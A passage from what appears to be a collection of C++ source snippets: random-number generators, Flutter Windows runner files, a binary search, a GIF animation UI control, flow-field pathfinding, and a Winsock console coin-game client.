detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n        UNROLL(state, x, i, i, i + 1, i, i - detail_random::mt::MTconstants::diff);\n#endif // _VTL_MT_UNROLL_MORE\n    }\n    UNROLL(state, x, i, detail_random::mt::MTconstants::size - 1, 0, detail_random::mt::MTconstants::size - 1, detail_random::mt::MTconstants::period);\n    \n    for (size_t j = 0; j < detail_random::mt::MTconstants::size; ++j)\n    {\n        x = state.mt[j];\n        x ^= x >> 11;\n        x ^= x << 7 & 0x9d2c5680;\n        x ^= x << 15 & 0xefc60000;\n        x ^= x >> 18;\n        state.mt_temperred[j] = x;\n    }\n    state.index = 0;\n}\n\n#undef MT_M32\n#undef MT_L32\n#undef UNROLL\n\n#define ROTL64(x, s) ((x << s) | (x >> (64 - s)))\n#define ROTL32(x, s) ((x << s) | (x >> (32 - s)))\n\nVTL_CONSTEXPR20 split_mix64::split_mix64(state_type state) noexcept : m_state(state) {}\n\nVTL_CONSTEXPR20 split_mix64::result_type split_mix64::operator()() noexcept\n{\n    std::uint64_t z = (m_state += 0x9e3779b97f4a7c15);\n    z = (z ^ (z >> 30)) * 0xbf58476d1ce4e5b9;\n    z = (z ^ (z >> 27)) * 0x94d049bb133111eb;\n    return z ^ (z >> 31);\n}\n\nVTL_CONSTEXPR20 split_mix64::state_type split_mix64::get_state() const noexcept\n{\n    return m_state;\n}\n\nVTL_CONSTEXPR20 void split_mix64::set_state(state_type state) noexcept\n{\n    m_state = state;\n}\n\nbool split_mix64::operator==(const split_mix64& right) const noexcept\n{\n    return m_state == right.m_state;\n}\n\nbool split_mix64::operator!=(const split_mix64& right) const noexcept\n{\n    return m_state != right.m_state;\n}\n\n\n#if _VTL_HAS_CPP_VERSION(20)\n\nVTL_CONSTEXPR20 xoshiro",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"profile_screen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"DataRow.h\"\r\n\r\nDataRow::DataRow(std::string d, std::string e, char c, int s)\r\n    : date(d), exdate(e), cp_flag(c), strike_pr(s) {}  // Initialize a DataRow object with given values\r\n\r\nstd::vector<DataRow> constructDataRows(\r\n    const std::vector<std::string>& dates,\r\n    const std::vector<std::string>& exdates,\r\n    const std::vector<char>& cp_flags,\r\n    const std::vector<int>& strike_prs\r\n) {\r\n    std::vector<DataRow> dataRows;  // Vector to hold constructed DataRow objects\r\n\r\n    // Ensure all input vectors have the same size\r\n    if (dates.size() != exdates.size() || dates.size() != cp_flags.size() || dates.size() != strike_prs.size()) {\r\n        std::cerr << \"Error: All input vectors must be of the same length.\" << std::endl;\r\n        return dataRows;\r\n    }\r\n\r\n    // Construct DataRow objects and add them to the dataRows vector\r\n    for (size_t i = 0; i < dates.size(); ++i) {\r\n        DataRow row(dates[i], exdates[i], cp_flags[i], strike_prs[i]);\r\n        dataRows.push_back(row);\r\n    }\r\n\r\n    return dataRows;\r\n}\r\n\r\nint binary_search_row(const std::vector<DataRow>& data, const DataRow& target) {\r\n    // Perform binary search on a vector of DataRow objects\r\n    int left = 0;\r\n    int right = data.size() - 1;\r\n\r\n    while (left <= right) {\r\n        int mid = left + (right - left) / 2;\r\n\r\n        // Compare DataRow fields to determine position in search\r\n        if (data[mid].date == target.date && \r\n            data[mid].exdate == target.exdate && \r\n            data[mid].cp_flag == target.cp_flag && \r\n            data[mid].strike_pr == target.strike_pr) {\r\n            return mid;  // Target found\r\n        } \r\n        else if (data[mid].date < target.date || \r\n                 (data[mid].date == target.date && data[mid].exdate < target.exdate) ||\r\n                 (data[mid].date == target.date && data[mid].exdate == target.exdate && data[mid].cp_flag < target.cp_flag) ||\r\n                 (data[mid].date == target.date && data[mid].exdate == target.exdate && data[mid].cp_flag == target.cp_flag && data[mid].strike_pr < target.strike_pr)) {\r\n            left = mid + 1;  // Search in the right half\r\n        } \r\n        else {\r\n            right = mid - 1;  // Search in the left half\r\n        }\r\n    }\r\n\r\n    return -1;  // Target not found\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"example\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"StdAfx.h\"\n#include \"UIGifAnim.h\"\n\n///////////////////////////////////////////////////////////////////////////////////////\nnamespace DuiLib\n{\n\tIMPLEMENT_DUICONTROL(CGifAnimUI)\n\n\t\tCGifAnimUI::CGifAnimUI(void)\n\t{\n\t\tm_pGifImage\t\t\t=\tNULL;\n\t\tm_pPropertyItem\t\t=\tNULL;\n\t\tm_nFrameCount\t\t=\t0;\t\n\t\tm_nFramePosition\t=\t0;\t\n\t\tm_bIsAutoPlay\t\t=\ttrue;\n\t\tm_bIsAutoSize\t\t=\tfalse;\n\t\tm_bIsPlaying\t\t=\tfalse;\n\n\t}\n\n\n\tCGifAnimUI::~CGifAnimUI(void)\n\t{\n\t\tDeleteGif();\n\t\tm_pManager->KillTimer( this, EVENT_TIEM_ID );\n\n\t}\n\n\tLPCTSTR CGifAnimUI::GetClass() const\n\t{\n\t\treturn _T(\"GifAnimUI\");\n\t}\n\n\tLPVOID CGifAnimUI::GetInterface( LPCTSTR pstrName )\n\t{\n\t\tif( _tcsicmp(pstrName, DUI_CTR_GIFANIM) == 0 ) return static_cast<CGifAnimUI*>(this);\n\t\treturn CControlUI::GetInterface(pstrName);\n\t}\n\n\tvoid CGifAnimUI::DoInit()\n\t{\n\t\tInitGifImage();\n\t}\n\n\tbool CGifAnimUI::DoPaint(HDC hDC, const RECT& rcPaint, CControlUI* pStopControl)\n\t{\n\t\tif( !::IntersectRect( &m_rcPaint, &rcPaint, &m_rcItem ) ) return true;\n\t\tif ( NULL == m_pGifImage )\n\t\t{\t\t\n\t\t\tInitGifImage();\n\t\t}\n\t\tDrawFrame( hDC );\n\t\treturn true;\n\t}\n\n\tvoid CGifAnimUI::DoEvent( TEventUI& event )\n\t{\n\t\tif( event.Type == UIEVENT_TIMER )\n\t\t\tOnTimer( (UINT_PTR)event.wParam );\n\t}\n\n\tvoid CGifAnimUI::SetVisible(bool bVisible /* = true */)\n\t{\n\t\tCControlUI::SetVisible(bVisible);\n\t\tif (bVisible)\n\t\t\tPlayGif();\n\t\telse\n\t\t\tStopGif();\n\t}\n\n\tvoid CGifAnimUI::SetAttribute(LPCTSTR pstrName, LPCTSTR pstrValue)\n\t{\n\t\tif( _tcsicmp(pstrName, _T(\"bkimage\")) == 0 ) SetBkImage(pstrValue);\n\t\telse if( _tcsicmp(pstrName, _T(\"autoplay\")) == 0 ) {\n\t\t\tSetAutoPlay(_tcsicmp(pstrValue, _T(\"true\")) == 0);\n\t\t}\n\t\telse if( _tcsicmp(pstrName, _T(\"autosize\")) == 0 ) {\n\t\t\tSetAutoSize(_tcsicmp(pstrValue, _T(\"true\")) == 0);\n\t\t}\n\t\telse\n\t\t\tCControlUI::SetAttribute(pstrName, pstrValue);\n\t}\n\n\tvoid CGifAnimUI::SetBkImage(LPCTSTR pStrImage)\n\t{\n\t\tif( m_sBkImage == pStrImage || NULL == pStrImage) return;\n\n\t\tm_sBkImage = pStrImage;\n\n\t\tStopGif();\n\t\tDeleteGif();\n\n\t\tInvalidate();\n\n\t}\n\n\tLPCTSTR CGifAnimUI::GetBkImage()\n\t{\n\t\treturn m_sBkImage.GetData();\n\t}\n\n\tvoid CGifAnimUI::SetAutoPlay(bool bIsAuto)\n\t{\n\t\tm_bIsAutoPlay = bIsAuto;\n\t}\n\n\tbool CGifAnimUI::IsAutoPlay() const\n\t{\n\t\treturn m_bIsAutoPlay;\n\t}\n\n\tvoid CGifAnimUI::SetAutoSize(bool bIsAuto)\n\t{\n\t\tm_bIsAutoSize = bIsAuto;\n\t}\n\n\tbool CGifAnimUI::IsAutoSize() const\n\t{\n\t\treturn m_bIsAutoSize;\n\t}\n\n\tvoid CGifAnimUI::PlayGif()\n\t{\n\t\tif (m_bIsPlaying || m_pGifImage == NULL || m_nFrameCount <= 1)\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\tlong lPause = ((long*) m_pPropertyItem->value)[m_nFramePosition] * 10;\n\t\tif ( lPause == 0 ) lPause = 100;\n\t\tm_pManager->SetTimer( this, EVENT_TIEM_ID, lPause );\n\n\t\tm_bIsPlaying = true;\n\t}\n\n\tvoid CGifAnimUI::PauseGif()\n\t{\n\t\tif (!m_bIsPlaying || m_pGifImage == NULL)\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\tm_pManager->KillTimer(this, EVENT_TIEM_ID);\n\t\tthis->Invalidate();\n\t\tm_bIsPlaying = false;\n\t}\n\n\tvoid CGifAnimUI::StopGif()\n\t{\n\t\tif (!m_bIsPlaying)\n\t\t{\n\t\t\treturn;\n\t\t}\n\n\t\tm_pManager->KillTimer(this, EVENT_TIEM_ID);\n\t\tm_nFramePosition = 0;\n\t\tthis->Invalidate();\n\t\tm_bIsPlaying = false;\n\t}\n\n\tvoid CGifAnimUI::InitGifImage()\n\t{\n\t\tTImageInfo* pImageInfo = CRenderEngine::GdiplusLoadImage(GetBkImage());\n\t\tif(pImageInfo != NULL) {\n\t\t\tm_pGifImage = pImageInfo->pImage;\n\n\t\t\tdelete pImageInfo;\n\t\t\tpImageInfo = NULL;\n\t\t}\n\t\tif ( NULL == m_pGifImage ) return;\n\n\t\tUINT nCount\t= 0;\n\t\tnCount\t=\tm_pGifImage->GetFrameDimensionsCount();\n\t\tGUID* pDimensionIDs\t=\tnew GUID[ nCount ];\n\t\tm_pGifImage->GetFrameDimensionsList( pDimensionIDs, nCount );\n\t\tm_nFrameCount\t=\tm_pGifImage->GetFrameCount( &pDimensionIDs[0] );\n\t\tif (m_nFrameCount > 1)\n\t\t{\n\t\t\tint nSize = m_pGifImage->GetPropertyItemSize(PropertyTagFrameDelay);\n\t\t\tm_pPropertyItem = (Gdiplus::PropertyItem*) malloc(nSize);\n\t\t\tm_pGifImage->GetPropertyItem(PropertyTagFrameDelay, nSize, m_pPropertyItem);\n\t\t}\n\t\tdelete[]  pDimensionIDs;\n\t\tpDimensionIDs = NULL;\n\n\t\tif (m_bIsAutoSize)\n\t\t{\n\t\t\tSetFixedWidth(m_pGifImage->GetWidth());\n\t\t\tSetFixedHeight(m_pGifImage->GetHeight());\n\t\t}\n\t\tif (m_bIsAutoPlay)\n\t\t{\n\t\t\tPlayGif();\n\t\t}\n\t}\n\n\tvoid CGifAnimUI::DeleteGif()\n\t{\n\t\tif ( m_pGifImage != NULL )\n\t\t{\n\t\t\tdelete m_pGifImage;\n\t\t\tm_pGifImage = NULL;\n\t\t}\n\n\t\tif ( m_pPropertyItem != NULL )\n\t\t{\n\t\t\tfree( m_pPropertyItem );\n\t\t\tm_pPropertyItem = NULL;\n\t\t}\n\t\tm_nFrameCount\t\t=\t0;\t\n\t\tm_nFramePosition\t=\t0;\t\n\t}\n\n\tvoid CGifAnimUI::OnTimer( UINT_PTR idEvent )\n\t{\n\t\tif ( idEvent != EVENT_TIEM_ID )\n\t\t\treturn;\n\t\tm_pManager->KillTimer( this, EVENT_TIEM_ID );\n\t\tthis->Invalidate();\n\n\t\tm_nFramePosition = (++m_nFramePosition) % m_nFrameCount;\n\n\t\tlong lPause = ((long*) m_pPropertyItem->value)[m_nFramePosition] * 10;\n\t\tif ( lPause == 0 ) lPause = 100;\n\t\tm_pManager->SetTimer( this, EVENT_TIEM_ID, lPause );\n\t}\n\n\tvoid CGifAnimUI::DrawFrame( HDC hDC )\n\t{\n\t\tif ( NULL == hDC || NULL == m_pGifImage ) return;\n\t\tGUID pageGuid = Gdiplus::FrameDimensionTime;\n\t\tGdiplus::Graphics graphics( hDC );\n\t\tgraphics.DrawImage( m_pGifImage, m_rcItem.left, m_rcItem.top, m_rcItem.right-m_rcItem.left, m_rcItem.bottom-m_rcItem.top );\n\t\tm_pGifImage->SelectActiveFrame( &pageGuid, m_n",
    "/*\n    This Source Code Form is subject to the terms of the Mozilla Public\n    License, v. 2.0. If a copy of the MPL was not distributed with this\n    file, You can obtain one at https://mozilla.org/MPL/2.0/.\n*/\n\n#include <proxima/proxima.hpp>\n\n#include <cmath>\n#include <list>\n\nusing namespace proxima;\n\nvoid proxima::GenerateIntegrationField(const Grid<uint8_t> *cost, const uint32_t target, Grid<uint16_t> *result)\n{\n    result->fill(65535);\n\n    std::list<uint32_t> openList;\n    (*result)[target] = 0;\n    openList.push_back(target);\n\n    while (!openList.empty())\n    {\n        // Get next node in open list\n        uint32_t id = openList.front();\n        openList.pop_front();\n\n        auto [x, y] = cost->getCoordinate(id);\n\n        // Get neighbours\n        std::vector<uint32_t> neighbours = cost->getDirectNeighbours(x, y);\n\n        for (uint32_t i = 0; i < neighbours.size(); i++)\n        {\n            if ((*cost)[neighbours[i]] == 255)\n                continue;\n\n            uint32_t endCost = (*result)[id] + (*cost)[neighbours[i]];\n            if (endCost < (*result)[neighbours[i]])\n            {\n                openList.push_back(neighbours[i]);\n                (*result)[neighbours[i]] = (uint16_t)endCost;\n            }\n        }\n    }\n}\n\nvoid proxima::CombineIntegrationFields(const Grid<uint16_t> *a, const Grid<uint16_t> *b, Grid<uint16_t> *c)\n{   \n    for (uint32_t i = 0; i < c->area(); i++)\n    {\n        (*c)[i] = std::min((*a)[i], (*b)[i]);\n    }\n}\n\nuint32_t proxima::GetBestNeighbour(const Grid<uint16_t> *intField, const uint32_t x, const uint32_t y)\n{\n    uint16_t best = (*intField)(x, y);\n    uint32_t bestId = intField->getIndex(x, y);\n\n    bool top = false, bottom = false, left = false, right = false;\n\n    // First check direct neighbours\n    std::vector<uint32_t> direct = intField->getDirectNeighbours(x, y);\n    for (uint32_t &n : direct)\n    {\n        if ((*intField)[n] < best)\n        {\n            best = (*intField)[n];\n            bestId = n;\n        }\n        else if ((*intField)[n] == 65535)\n        {\n            auto [nx, ny] = intField->getCoordinate(n);\n            if (nx < x) left = true;\n            else if (nx > x) right = true;\n            else if (ny > y) top = true;\n            else if (ny < y) bottom = true;\n        }\n    }\n\n    // Now check diagonal neighbours\n    std::vector<uint32_t> diagonal = intField->getDiagonalNeighbours(x, y);\n    for (uint32_t &n : diagonal)\n    {\n        if ((*intField)[n] < best)\n        {\n            // More complicated: Can we actually reach this cell?\n            auto [nx, ny] = intField->getCoordinate(n);\n            // Left...\n            if (nx < x && !left)\n                goto check;\n            else if (nx > x && !right) // Right...\n                goto check;\n            \n            // Cell is unreachable\n            continue;\n            \n            // Check if the cell is top or bottom\n            check:\n            // Top\n            if (ny > y && top)\n                continue;\n            else if (ny < y && bottom) // Bottom\n                continue;\n\n            best = (*intField)[n];\n            bestId = n;\n        }\n    }\n\n    return bestId;\n}\n\nvoid proxima::GenerateVectorField(const Grid<uint16_t> *intField, Grid<float> *result)\n{\n    result->fill(0.0f);\n\n    for (uint32_t i = 0; i < intField->area(); i++)\n    {\n        auto [x, y] = intField->getCoordinate(i);\n        std::vector<uint32_t> neighbours = intField->getAllNeighbours(x, y);\n\n        uint16_t best = (*intField)[i];\n        uint32_t bestId = i;\n        for (auto &n : neighbours)\n        {\n            if ((*intField)[n] < best)\n            {\n                best = (*intField)[n];\n                bestId = n;\n            }\n        }\n        auto [bx, by] = intField->getCoordinate(bestId);\n        float vx = float(bx) - float(x);\n        float vy = float(by) - float(y);\n        (*result)[i] = std::atan2(vy, vx);\n    }\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#define WIN32_LEAN_AND_MEAN\n\n#include <iostream>\n#include <windows.h>\n#include <ws2tcpip.h>\n#include <conio.h>\n#include <string>\n#include <ctime>\n#include <iomanip>\n#include <thread>\n#include <chrono>\n#include <sstream>\nusing namespace std;\n\n#pragma comment (lib, \"Ws2_32.lib\")\n#pragma comment (lib, \"Mswsock.lib\")\n#pragma comment (lib, \"AdvApi32.lib\")\n#pragma warning (disable:4996)\n\n\n#define DEFAULT_BUFLEN 512\n#define DEFAULT_PORT \"27015\"\n\n#define PAUSE 1\n\n// Attempt to connect to an address until one succeeds\nSOCKET ConnectSocket = INVALID_SOCKET;\n\nCOORD server_smile;\nCOORD client_smile;\nchar** map = nullptr;\nint client_coin_count = 0;\n\n\n// \u0441\u0443\u0432\u043e\u0440\u0435 \u043f\u0435\u0440\u0435\u0440\u0430\u0445\u0443\u0432\u0430\u043d\u043d\u044f\nenum class KeyCodes { LEFT = 75, RIGHT = 77, UP = 72, DOWN = 80, ENTER = 13, ESCAPE = 27, SPACE = 32, ARROWS = 224 };\nenum class Colors { BLUE = 9, RED = 12, BLACK = 0, YELLOW = 14, DARKGREEN = 2 };\n\nvoid HandleCoinCollision(char** map, int x, int y) {\n\tif (map[y][x] == '.') {\n\t\tif (x == client_smile.X && y == client_smile.Y) {\n\t\t\tclient_coin_count++;\n\t\t\tmap[y][x] = ' ';\n\t\t}\n\t}\n}\n\nvoid SendClientCoins() {\n\t// \u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440 \u0441 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0435\u0439 \u043e \u0441\u043e\u0431\u0440\u0430\u043d\u043d\u044b\u0445 \u043c\u043e\u043d\u0435\u0442\u0430\u0445\n\tstring coinCountMessage = \"CLIENT_COINS:\" + to_string(client_coin_count);\n\tint iSendResult = send(ConnectSocket, coinCountMessage.c_str(), coinCountMessage.size(), 0);\n\tif (iSendResult == SOCKET_ERROR) {\n\t\tcout << \"send failed with error: \" << WSAGetLastError() << \"\\n\";\n\t\tclosesocket(ConnectSocket);\n\t\tWSACleanup();\n\t\treturn;\n\t}\n}\n\nDWORD WINAPI Sender(void* param)\n{\n\tHANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);\n\n\n\tCONSOLE_CURSOR_INFO cursor;\n\tcursor.bVisible = false;\n\tcursor.dwSize = 100;\n\tSetConsoleCursorInfo(h, &cursor);\n\n\twhile (true)\n\t{\n\t\tKeyCodes code = (KeyCodes)_getch();\n\t\tif (code == KeyCodes::ARROWS) code = (KeyCodes)_getch(); // \u0435\u0441\u043b\u0438 \u043f\u0435\u0440\u0432\u044b\u0439 \u043a\u043e\u0434 224 - \u0442\u043e \u044d\u0442\u043e \u0441\u0442\u0440\u0435\u043b\u043a\u0430 (\u043d\u043e \u043f\u043e\u043a\u0430 \u043d\u0435 \u043f\u043e\u043d\u044f\u0442\u043d\u043e, \u043a\u0430\u043a\u0430\u044f), \u043d\u0443\u0436\u043d\u043e \u0432\u044b\u0437\u0432\u0430\u0442\u044c \u0444\u0443\u043d\u043a\u0446\u0438\u044e \u0413\u0415\u0427 \u0435\u0449\u0451 \u0440\u0430\u0437 \u0434\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f \u043d\u043e\u0440\u043c\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043a\u043e\u0434\u0430 \n\n\t\t// \u0441\u0442\u0438\u0440\u0430\u043d\u0438\u0435 \u0441\u043c\u0430\u0439\u043b\u0438\u043a\u0430 \u043a\u043b\u0438\u0435\u043d\u0442\u0430 \u0432 \u0435\u0433\u043e \"\u0441\u0442\u0430\u0440\u044b\u0445\" \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u0445\n\t\tSetConsoleCursorPosition(h, client_smile);\n\t\tcout << \" \";\n\n\t\tint direction = 0; // 1L 2R 3U 4D\n\n\t\tif (code == KeyCodes::LEFT && map[client_smile.Y][client_smile.X - 1] != '#') {\n\t\t\tclient_smile.X--;\n\t\t\tHandleCoinCollision(map, client_smile.X, client_smile.Y);\n\n\t\t\tdirection = 1;\n\t\t}\n\t\telse if (code == KeyCodes::RIGHT && map[client_smile.Y][client_smile.X + 1] != '#') {\n\t\t\tclient_smile.X++;\n\t\t\tHandleCoinCollision(map, client_smile.X, client_smile.Y);\n\n\t\t\tdirection = 2;\n\t\t}\n\t\telse if (code == KeyCodes::UP && map[client_smile.Y - 1][client_smile.X] != '#') {\n\t\t\tclient_smile.Y--;\n\t\t\tHandleCoinCollision(map, client_smile.X, client_smile.Y);\n\n\t\t\tdirection = 3;\n\t\t}\n\t\telse if (code == KeyCodes::DOWN && map[client_smile.Y + 1][client_smile.X] != '#') {\n\t\t\tclient_smile.Y++;\n\t\t\tHandleCoinCollision(map, client_smile.X, client_smile.Y);\n\n\t\t\tdirection = 4;\n\t\t}\n\n\t\t// \u043e\u0442\u0440\u0438\u0441\u043e\u0432\u043a\u0430 \u0441\u043c\u0430\u0439\u043b\u0438\u043a\u0430 \u043a\u043b\u0438\u0435\u043d\u0442\u0430 \u0432 \u0435\u0433\u043e \"\u043d\u043e\u0432\u044b\u0445\" \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u0445\n\t\tSetConsoleCursorPosition(h, client_smile);\n\t\tSetConsoleTextAttribute(h, WORD(Colors::BLUE));\n\t\tcout << (char)160; // cout << \"@\";\n\t\tSendClientCoins();\n\n\t\tif ((server_smile.X == client_smile.X && server_smile.Y == client_smile.Y) ||\n\t\t\t(abs(server_smile.X - client_smile.X) <= 1 && abs(server_smile.Y - client_smile.Y) <= 1)) {\n\t\t\tsystem(\"title Meeting!!\");\n\t\t}\n\t\telse {\n\t\t\t// \u041f\u043e\u0432\u0435\u0440\u043d\u0435\u043d\u043d\u044f \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u043d\u043e\u0457 \u043d\u0430\u0437\u0432\u0438 \u0432\u0456\u043a\u043d\u0430\n\t\t\tsystem(\"title CLIENT SIDE\");\n\t\t}\n\n\t\tchar message[200];\n\t\tstrcpy_s(message, 199, to_string(direction).c_str());\n\n\t\tint iResult = send(ConnectSocket, message, (int)strlen(message), 0);\n\t\tif (iResult == SOCKET_ERROR) {\n\t\t\tcout << \"send failed with error: \" << WSAGetLastError() << \"\\n\";\n\t\t\tclosesocket(ConnectSocket);\n\t\t\tWSACleanup();\n\t\t\treturn 15;\n\t\t}\n\t}\n\n\treturn 0;\n}\n\n\n// & - \u043a\u0430\u0436\u0435 \u043f\u0440\u043e \u0442\u0435, \u0449\u043e \u0432i\u0434\u0431\u0443\u0432\u0430\u0435\u0442\u044c\u0441\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0430 \u0417\u0410 \u041f\u041e\u0421\u0418\u041b\u0410\u041d\u041d\u042f\u041c, \u0430 \u0446\u0435 \u043e\u0437\u043d\u0430\u0447\u0430\u0435, \u0449\u043e \u0432\u0441i\n// \u0437\u043ci\u043d\u0438, \u044f\u043ai \u0432i\u0434\u0431\u0443\u0434\u0443\u0442\u044c\u0441\u044f, \u0432\u043e\u043d\u0438 \u0437\u0431\u0435\u0440\u0435\u0436\u0443\u0442\u044c\u0441\u044f!!!\nvoid ParseData(char data[], char**& map, unsigned int& rows, unsigned int& cols)\n{\n\tstring info = data;\n\tint h_index = info.find(\"h\"); // 0\n\tint w_index = info.find(\"w\"); // 2\n\tint d_index = info.find(\"d\"); // 4\n\tstring r = \"\";\n\tif (w_index == 2) r = info.substr(1, 1);\n\telse r = info.substr(1, 2);\n\tint rows_count = stoi(r); // \u0440\u044f\u0434\u043a\u0438\n\t//cout << rows_count << \"\\n\";\n\tint distance = d_index - w_index - 1; // 2 3 4\n\tstring columns = info.substr(w_index + 1, distance);\n\tint columns_count = stoi(columns); // \u0441\u0442\u043e\u0432\u0431\u0447\u0438\u043a\u0438\n\t//cout << columns_count << \"\\n\";\n\tstring map_data = info.substr(d_index + 1, rows_count * columns_count);\n\n\trows = rows_count;\n\tcols = columns_count;\n\t// char map[rows_count][columns_count]; // \u043a\u043b\u0438\u0435\u043d\u0442 \u043d\u0435 \u0437\u043d\u0430\u0435\u0442 \u0440\u0430\u0437\u043c\u0435\u0440\u043e\u0432 \u043b\u043e\u043a\u0430\u0446\u0438\u0438\n\tint map_data_current_element = 0;\n\tmap = new char* [rows_count];\n\tfor (int y = 0; y < rows_count; y++)\n\t{\n\t\tmap[y] = new char[columns_count];\n\t\tfor (int x = 0; x < columns_count; x++)\n\t\t{\n\t\t\tmap[y][x] = map_data[map_data_current_element];\n\t\t\t//cout << map[y][x] << \",\";\n\t\t\tmap_data_current_element++;\n\t\t}\n\t}\n}\n\nvoid ShowMap(char** map, const unsigned int height, const unsigned int width) {\n\tsetlocale(0, \"C\");\n\tHANDLE h = GetStdHandle(",
